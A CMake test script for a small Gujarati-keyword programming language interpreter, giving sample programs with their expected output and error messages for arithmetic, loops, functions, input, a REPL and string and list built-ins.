file(MAKE_DIRECTORY "${TEST_BINARY_DIR}")
set(input_text "")

if(TEST_CASE STREQUAL "arithmetic_and_comparisons")
    set(source [=[આવો
છાપો 1 + 2 * 3 == 7;
છાપો 1 == 1;
છાપો 1 != 2;
છાપો 1 < 2;
છાપો 2 <= 2;
છાપો 3 > 2;
છાપો 3 >= 3;
આવજો
]=])
    set(expected_stdout "1\n1\n1\n1\n1\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "conditionals")
    set(source [=[આવો
જો (0) { છાપો "wrong"; } નહિતર જો (2 > 1) { છાપો "second"; } નહિતર { છાપો "wrong"; }
જો (1 < 0) { છાપો "wrong"; } નહિતર { છાપો "else"; }
આવજો
]=])
    set(expected_stdout "second\nelse\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "logical_operators")
    set(source [=[આવો
છાપો 1 અને 2 > 1;
છાપો 1 અથવા 0 અને 0;
છાપો નહીં 1 == 1;
છાપો નહીં 0 == 1;
જો (2 > 1 અને નહીં 0) { છાપો "and and not"; }
જો (0 અથવા 3 == 3) { છાપો "or"; }
આવજો
]=])
    set(expected_stdout "1\n1\n0\n1\nand and not\nor\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "logical_short_circuit")
    set(source [=[આવો
છાપો 1 અથવા 1 / 0 == 0;
છાપો 0 અને 1 / 0 == 0;
આવજો
]=])
    set(expected_stdout "1\n0\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "logical_type_error")
    set(source [=[આવો
છાપો "text" અને 1;
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "logical operators require a number or 'નકામો'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "while_loop")
    set(source [=[આવો
ગણતરી = 0;
જ્યાં સુધી (ગણતરી < 3) {
    ગણતરી = ગણતરી + 1;
    હાલનું = ગણતરી;
    છાપો હાલનું;
}
છાપો હાલનું;
આવજો
]=])
    set(expected_stdout "1\n2\n3\n3\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "nested_while_loops")
    set(source [=[આવો
બહાર = 0;
અંદર = 0;
સરવાળો = 0;
જ્યાં સુધી (બહાર < 2) {
    અંદર = 0;
    જ્યાં સુધી (અંદર < 2) {
        સરવાળો = સરવાળો + 1;
        અંદર = અંદર + 1;
    }
    બહાર = બહાર + 1;
}
છાપો સરવાળો;
આવજો
]=])
    set(expected_stdout "4\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "while_false_condition")
    set(source [=[આવો
જ્યાં સુધી (0) { છાપો "wrong"; }
છાપો "after";
આવજો
]=])
    set(expected_stdout "after\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "while_in_skipped_branch")
    set(source [=[આવો
જો (0) { જ્યાં સુધી (1) { છાપો "wrong"; } }
છાપો "after";
આવજો
]=])
    set(expected_stdout "after\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "strings_and_null")
    set(source [=[આવો
છાપો નકામો;
છાપો "line\nnext";
આવજો
]=])
    set(expected_stdout "નકામો\nline\nnext\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "string_concatenation")
    set(source [=[આવો
નામ = "હર્ષ";
સંદેશ = "નમસ્તે, " + નામ + "!";
છાપો સંદેશ;
છાપો "line\n" + "next";
છાપો 1 + 2;
આવજો
]=])
    set(expected_stdout "નમસ્તે, હર્ષ!\nline\nnext\n3\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "string_number_addition_error")
    set(source [=[આવો
છાપો "count: " + 2;
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "arithmetic requires numbers")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "string_equality")
    set(source [=[આવો
છાપો "હર્ષ" == "હર્ષ";
છાપો "હર્ષ" != "હર્ષ";
છાપો "હર્ષ" != "હર્ષભાઈ";
છાપો "line\nnext" == "line\nnext";
છાપો "હર્ષ" + "ભાઈ" == "હર્ષભાઈ";
જો ("હર્ષ" == "હર્ષ") { છાપો "match"; }
આવજો
]=])
    set(expected_stdout "1\n0\n1\n1\n1\nmatch\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "string_equality_input")
    set(source [=[આવો
નામ = વાંચો("Name? ");
જો (નામ == "હર્ષ") { છાપો "welcome"; }
આવજો
]=])
    set(input_text "હર્ષ\n")
    set(expected_stdout "Name? welcome\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "string_equality_type_error")
    set(source [=[આવો
છાપો "1" == 1;
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "comparisons require numbers")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "string_ordering_type_error")
    set(source [=[આવો
છાપો "a" < "b";
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "comparisons require numbers")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "string_length_ascii")
    set(source [=[આવો
છાપો લંબાઈ("");
છાપો લંબાઈ("Gujarati");
આવજો
]=])
    set(expected_stdout "0\n8\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "string_length_gujarati")
    set(source [=[આવો
છાપો લંબાઈ("હર્ષ");
નામ = વાંચો("Name? ");
છાપો લંબાઈ(નામ);
આવજો
]=])
    set(input_text "હર્ષ\n")
    set(expected_stdout "4\nName? 4\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "string_length_escapes")
    set(source [=[આવો
છાપો લંબાઈ("a\n");
છાપો લંબાઈ("ગુ" + "જ");
આવજો
]=])
    set(expected_stdout "2\n3\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "string_length_wrong_argument_count")
    set(source [=[આવો
છાપો લંબાઈ();
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "string_length_type_error")
    set(source [=[આવો
છાપો લંબાઈ(1);
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a string or list argument for 'લંબાઈ'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_string_length")
    set(source [=[આવો
કાર્ય લંબાઈ(text) { પરત 0; }
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "variables")
    set(source [=[આવો
ગણતરી = 3;
ગણતરી = ગણતરી + 2;
count = ગણતરી * 2;
item_2 = count + 1;
છાપોવસ્તુ = item_2 + 1;
કે = 13;
છાપો ગણતરી;
છાપો count;
છાપો છાપોવસ્તુ;
છાપો કે;
સંદેશ = "Gujarati \nstring";
છાપો સંદેશ;
નકામું = નકામો;
છાપો નકામું;
જો (ગણતરી == 5) { છાપો "variable condition"; }
આવજો
]=])
    set(expected_stdout "5\n10\n12\n13\nGujarati \nstring\nનકામો\nvariable condition\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "variable_in_skipped_branch")
    set(source [=[આવો
જો (0) { ખોટું = 1; }
સાચું = 2;
છાપો સાચું;
આવજો
]=])
    set(expected_stdout "2\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "variable_skipped_not_created")
    set(source [=[આવો
જો (0) { છુપાયેલું = 1; }
છાપો છુપાયેલું;
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "undefined variable")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "variable_reassignment")
    set(source [=[આવો
કિંમત = 1;
કિંમત = 2;
છાપો કિંમત;
આવજો
]=])
    set(expected_stdout "2\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "undefined_variable")
    set(source [=[આવો
જવાબ = અજ્ઞાત;
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "undefined variable")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "undefined_variable_gujarati")
    set(source [=[આવો
છાપો અજ્ઞાત;
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "અવ્યાખ્યાયિત ચલ")
    set(expect_failure TRUE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "function_calls")
    set(source [=[આવો
કાર્ય સરવાળો(પહેલું, બીજું) {
    પરત પહેલું + બીજું;
}
છાપો સરવાળો(2, 3);
આવજો
]=])
    set(expected_stdout "5\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "nested_function_calls")
    set(source [=[આવો
કાર્ય બમણું(કિંમત) { પરત કિંમત * 2; }
કાર્ય સરવાળો(પહેલું, બીજું) { પરત પહેલું + બીજું; }
છાપો સરવાળો(બમણું(3), બમણું(4));
આવજો
]=])
    set(expected_stdout "14\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "recursive_function")
    set(source [=[આવો
કાર્ય ગુણાકાર(n) {
    જો (n <= 1) { પરત 1; }
    પરત n * ગુણાકાર(n - 1);
}
છાપો ગુણાકાર(5);
આવજો
]=])
    set(expected_stdout "120\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "function_returns")
    set(source [=[આવો
કાર્ય ખાલી() { }
કાર્ય સ્પષ્ટખાલી() { પરત; }
કાર્ય પહેલા() {
    જ્યાં સુધી (1) { પરત 9; }
    પરત 10;
}
છાપો ખાલી();
છાપો સ્પષ્ટખાલી();
છાપો પહેલા();
આવજો
]=])
    set(expected_stdout "નકામો\nનકામો\n9\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "function_local_and_global_variables")
    set(source [=[આવો
કિંમત = 7;
કાર્ય સ્થાનિક() {
    કિંમત = 3;
    પરત કિંમત;
}
કાર્ય વૈશ્વિકવાંચો() { પરત કિંમત; }
કાર્ય વૈશ્વિકબદલો() { કિંમત = 8; }
કાર્ય નવીસ્થાનિક() {
    અસ્થાયી = 1;
    અસ્થાયી = અસ્થાયી + 1;
    પરત અસ્થાયી;
}
છાપો સ્થાનિક();
છાપો વૈશ્વિકવાંચો();
વૈશ્વિકબદલો();
છાપો વૈશ્વિકવાંચો();
છાપો નવીસ્થાનિક();
છાપો નવીસ્થાનિક();
આવજો
]=])
    set(expected_stdout "3\n3\n8\n2\n2\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "function_undefined")
    set(source [=[આવો
છાપો અજ્ઞાત();
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "undefined function")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "function_wrong_argument_count")
    set(source [=[આવો
કાર્ય ઓળખો(કિંમત) { પરત કિંમત; }
છાપો ઓળખો();
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "function_duplicate")
    set(source [=[આવો
કાર્ય ઓળખો() { પરત 1; }
કાર્ય ઓળખો() { પરત 2; }
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "function is already declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "function_duplicate_parameter")
    set(source [=[આવો
કાર્ય ઓળખો(કિંમત, કિંમત) { પરત કિંમત; }
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "parameter is already declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "return_outside_function")
    set(source [=[આવો
પરત 1;
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "'પરત' can only be used inside a function")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "input")
    set(source [=[આવો
કાર્ય પૂછો() { પરત વાંચો("Name? "); }
નામ = પૂછો();
છાપો "Hello, " + નામ;
આવજો
]=])
    set(input_text "હર્ષ\n")
    set(expected_stdout "Name? Hello, હર્ષ\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "input_empty_line")
    set(source [=[આવો
જવાબ = વાંચો("Value: ");
છાપો જવાબ;
આવજો
]=])
    set(input_text "\n")
    set(expected_stdout "Value: \n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "input_long_line")
    string(REPEAT "x" 128 input_text)
    string(APPEND input_text "\n")
    set(source [=[આવો
જવાબ = વાંચો("Long: ");
છાપો જવાબ;
આવજો
]=])
    set(expected_stdout "Long: ${input_text}")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "input_eof")
    set(source [=[આવો
જવાબ = વાંચો("Enter: ");
આવજો
]=])
    set(input_text "")
    set(expected_stdout "Enter: ")
    set(expected_stderr "could not read a line from standard input")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "input_wrong_argument_count")
    set(source [=[આવો
જવાબ = વાંચો();
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "input_prompt_type")
    set(source [=[આવો
જવાબ = વાંચો(1);
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a string prompt for 'વાંચો'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "input_skipped_branch")
    set(source [=[આવો
જો (0) { છુપાયેલું = વાંચો("Do not ask: "); }
છાપો "after";
આવજો
]=])
    set(input_text "")
    set(expected_stdout "after\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "reserved_input_function")
    set(source [=[આવો
કાર્ય વાંચો(prompt) { પરત prompt; }
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "repl_persistence")
    set(source "")
    set(program_arguments --repl)
    set(input_text [=[count = 2;
count + 3
કાર્ય double(value) { પરત value * 2; }
double(count)
]=])
    set(expected_stdout "GujaratiLang> GujaratiLang> 5\nGujaratiLang> GujaratiLang> 4\nGujaratiLang> ")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "repl_error_recovery")
    set(source "")
    set(program_arguments --repl)
    set(input_text [=[છાપો (1 + );
છાપો 2 + 3;
]=])
    set(expected_stdout "GujaratiLang> GujaratiLang> 5\nGujaratiLang> ")
    set(expected_stderr "expected a number")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "repl_runtime_error_recovery")
    set(source "")
    set(program_arguments --repl)
    set(input_text [=[છાપો unknown;
છાપો 7;
]=])
    set(expected_stdout "GujaratiLang> GujaratiLang> 7\nGujaratiLang> ")
    set(expected_stderr "undefined variable")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "repl_input")
    set(source "")
    set(program_arguments --repl)
    set(input_text [=[name = વાંચો("Name? ");
હર્ષ
છાપો "Hello, " + name;
]=])
    set(expected_stdout "GujaratiLang> Name? GujaratiLang> Hello, હર્ષ\nGujaratiLang> ")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "repl_string_length")
    set(source "")
    set(program_arguments --repl)
    set(input_text [=[લંબાઈ("હર્ષ")
]=])
    set(expected_stdout "GujaratiLang> 4\nGujaratiLang> ")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "warnings_english")
    set(source [=[આવો
ચેતવણી "user warning";
છાપો 1;
આવજો
]=])
    set(expected_stdout "1\n")
    set(expected_stderr "warning: user warning")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "warnings_gujarati")
    set(source [=[આવો
ચેતવણી "user warning";
છાપો 1;
આવજો
]=])
    set(expected_stdout "1\n")
    set(expected_stderr "ચેતવણી: user warning")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "errors")
    set(source [=[આવો
ભૂલ "stop here";
છાપો 99;
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "error: stop here")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "fatal_errors")
    set(source [=[આવો
ઘાતક ભૂલ "stop here";
છાપો 99;
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "fatal error: stop here")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "invalid_condition")
    set(source [=[આવો
છાપો નકામો == 0;
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "comparisons require numbers")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "invalid_language")
    set(source [=[આવો
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "usage:")
    set(expect_failure TRUE)
    set(language_args --language fr)
elseif(TEST_CASE STREQUAL "romanized_keywords")
    set(source [=[aavo
kary double(value) { parat value * 2; }
count = 0;
jya_sudhi (count < 2 ane nahi 0) {
    count = count + 1;
}
jo (count == 2 athva 0) {
    chhapo double(count);
} nahitar_jo (count == 3) {
    chhapo 99;
} nahitar {
    chhapo nakamo;
}
chetavani "romanized warning";
aavjo
]=])
    set(expected_stdout "4\n")
    set(expected_stderr "warning: romanized warning")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "romanized_keyword_identifier_boundary")
    set(source [=[aavo
aavo_count = 3;
chhapo aavo_count;
aavjo
]=])
    set(expected_stdout "3\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "romanized_builtins")
    set(source [=[aavo
name = vancho("Name? ");
chhapo "Hello, " + name;
chhapo lambai(name);
aavjo
]=])
    set(input_text "Harsh\n")
    set(expected_stdout "Name? Hello, Harsh\n5\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "reserved_romanized_builtin")
    set(source [=[aavo
kary lambai(text) { parat 0; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_sankhya")
    set(source [=[aavo
chhapo sankhya("42") + 8;
chhapo sankhya("  -12.5  ") * 2;
chhapo સંખ્યા("100");
aavjo
]=])
    set(expected_stdout "50\n-25\n100\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_sankhya_error")
    set(source [=[aavo
chhapo sankhya("not_a_number");
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "could not parse string as a number")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_sankhya_type_error")
    set(source [=[aavo
chhapo sankhya(123);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a string argument for 'સંખ્યા' or 'sankhya'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_lakhan")
    set(source [=[aavo
chhapo "Val: " + lakhan(42);
chhapo "Pi: " + lakhan(3.14);
chhapo "Null: " + lakhan(nakamo);
chhapo "List: " + lakhan([1, "two", 3]);
chhapo "ગુજરાતી: " + લખાણ(99);
aavjo
]=])
    set(expected_stdout "Val: 42\nPi: 3.14\nNull: નકામો\nList: [1, two, 3]\nગુજરાતી: 99\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_prakar")
    set(source [=[aavo
chhapo prakar(42);
chhapo prakar("hello");
chhapo prakar([1, 2]);
chhapo prakar(nakamo);
chhapo પ્રકાર(100);
aavjo
]=])
    set(expected_stdout "number\nstring\nlist\nnull\nnumber\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "reserved_sankhya_lakhan_prakar")
    set(source [=[aavo
kary lakhan(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_umero")
    set(source [=[aavo
nums = [1, 2];
umero(nums, 3);
chhapo nums;
ઉમેરો(nums, 4);
chhapo nums;
words = [];
umero(words, "apple");
umero(words, "banana");
chhapo words;
nested = [[1]];
umero(nested, [2, 3]);
chhapo nested;
aavjo
]=])
    set(expected_stdout "[1, 2, 3]\n[1, 2, 3, 4]\n[apple, banana]\n[[1], [2, 3]]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_umero_error")
    set(source [=[aavo
umero(42, 10);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a list first argument for 'ઉમેરો' or 'umero'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_kapo")
    set(source [=[aavo
chhapo kapo("hello world", 0, 5);
chhapo kapo("hello world", 6);
chhapo kapo("hello world", 3, 4);
chhapo કાપો("ગુજરાતી", 0, 3);
chhapo kapo("hello", 10, 2);
chhapo kapo("hello", 2, 100);
aavjo
]=])
    set(expected_stdout "hello\nworld\nlo w\nગુજ\n\nllo\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_kapo_error")
    set(source [=[aavo
chhapo kapo(123, 0, 1);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a string first argument for 'કાપો' or 'kapo'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_shodho")
    set(source [=[aavo
chhapo shodho("hello world", "world");
chhapo shodho("hello world", "o");
chhapo shodho("hello world", "o", 5);
chhapo shodho("hello world", "xyz");
chhapo shodho("hello", "");
chhapo શોધો("ગુજરાતી", "રા");
chhapo shodho("ગુજરાતી", "નથી");
aavjo
]=])
    set(expected_stdout "6\n4\n7\n-1\n0\n3\n-1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_shodho_error")
    set(source [=[aavo
chhapo shodho("hello", 42);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected string arguments for 'શોધો' or 'shodho'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_umero_kapo_shodho")
    set(source [=[aavo
kary umero(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_kadho")
    set(source [=[aavo
items = [10, 20, 30];
last = kadho(items);
chhapo last;
chhapo items;
first = kadho(items, 0);
chhapo first;
chhapo items;
rem = કાઢો(items);
chhapo rem;
chhapo items;
aavjo
]=])
    set(expected_stdout "30\n[10, 20]\n10\n[20]\n20\n[]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_kadho_error")
    set(source [=[aavo
kadho([]);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "cannot remove item from an empty list")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_kadho")
    set(source [=[aavo
kary kadho(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_case_conversion")
    set(source [=[aavo
chhapo peli_abcd("hello world 123");
chhapo biji_abcd("HELLO WORLD 123");
chhapo પહેલી_એબીસીડી("mixed CASE!");
chhapo બીજી_એબીસીડી("mixed CASE!");
chhapo peli_abcd("ગુજરાતી");
aavjo
]=])
    set(expected_stdout "HELLO WORLD 123\nhello world 123\nMIXED CASE!\nmixed case!\nગુજરાતી\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_case_conversion_error")
    set(source [=[aavo
chhapo peli_abcd(123);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a string argument for case conversion")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_case_conversion")
    set(source [=[aavo
kary peli_abcd(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_math_utils")
    set(source [=[aavo
chhapo mahatam(10, 25);
chhapo nyunatam(10, 25);
chhapo dhan_mulya(-42.5);
chhapo dhan_mulya(17);
chhapo મહત્તમ(100, 50);
chhapo ન્યૂનતમ(100, 50);
chhapo ધન_મૂલ્ય(-99);
aavjo
]=])
    set(expected_stdout "25\n10\n42.5\n17\n100\n50\n99\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_math_utils_error")
    set(source [=[aavo
chhapo mahatam("10", 20);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected number arguments for math function")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_math_utils")
    set(source [=[aavo
kary mahatam(x, y) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_ultavo")
    set(source [=[aavo
items = [1, 2, 3, 4];
ultavo(items);
chhapo items;
chhapo ultavo(["a", "b", "c"]);
chhapo ઉલટાવો([42]);
chhapo ઉલટાવો([]);
aavjo
]=])
    set(expected_stdout "[4, 3, 2, 1]\n[c, b, a]\n[42]\n[]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_ultavo_error")
    set(source [=[aavo
chhapo ultavo("not a list");
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a list argument for 'ઉલટાવો' or 'ultavo'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_ultavo")
    set(source [=[aavo
kary ultavo(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_bhag")
    set(source [=[aavo
parts = bhag("red,green,blue", ",");
chhapo parts;
chars = bhag("hello", "");
chhapo chars;
gparts = ભાગ("સફરજન કેળૂ́", " ");
chhapo gparts;
aavjo
]=])
    set(expected_stdout "[red, green, blue]\n[h, e, l, l, o]\n[સફરજન, કેળૂ́]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_bhag_error")
    set(source [=[aavo
chhapo bhag(123, ",");
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected string arguments for 'ભાગ' or 'bhag'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_bhag")
    set(source [=[aavo
kary bhag(x, y) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_jodo")
    set(source [=[aavo
items = ["one", "two", "three"];
chhapo jodo(items, "-");
chhapo જોડો(["સૂર્ય", "ચંદ્ર"], " અને ");
chhapo jodo([1, 2, 3], ", ");
chhapo jodo([], ",");
aavjo
]=])
    set(expected_stdout "one-two-three\nસૂર્ય અને ચંદ્ર\n1, 2, 3\n\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_jodo_error")
    set(source [=[aavo
chhapo jodo("not a list", ",");
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected list and string separator arguments for 'જોડો' or 'jodo'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_jodo")
    set(source [=[aavo
kary jodo(x, y) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_saf")
    set(source [=[aavo
chhapo "[" + saf("  hello world  ") + "]";
chhapo "[" + saf("   ") + "]";
chhapo "[" + સાફ("   નમસ્તે ભારત   ") + "]";
aavjo
]=])
    set(expected_stdout "[hello world]\n[]\n[નમસ્તે ભારત]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_saf_error")
    set(source [=[aavo
chhapo saf(123);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a string argument for 'સાફ' or 'saf'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_saf")
    set(source [=[aavo
kary saf(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_ghat_mul")
    set(source [=[aavo
chhapo ghat(2, 3);
chhapo mul(16);
chhapo ઘાત(3, 2);
chhapo મૂળ(100);
aavjo
]=])
    set(expected_stdout "8\n4\n9\n10\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_ghat_mul_error")
    set(source [=[aavo
chhapo mul(-9);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "cannot calculate square root of a negative number")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_ghat_mul")
    set(source [=[aavo
kary ghat(x, y) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_gothvo")
    set(source [=[aavo
nums = [42, 5, 17, 3, 99, 0, -10];
gothvo(nums);
chhapo nums;
words = ["mango", "apple", "banana"];
chhapo gothvo(words);
g_list = ["કેળું", "ચીકુ", "કેરી"];
chhapo ગોઠવો(g_list);
aavjo
]=])
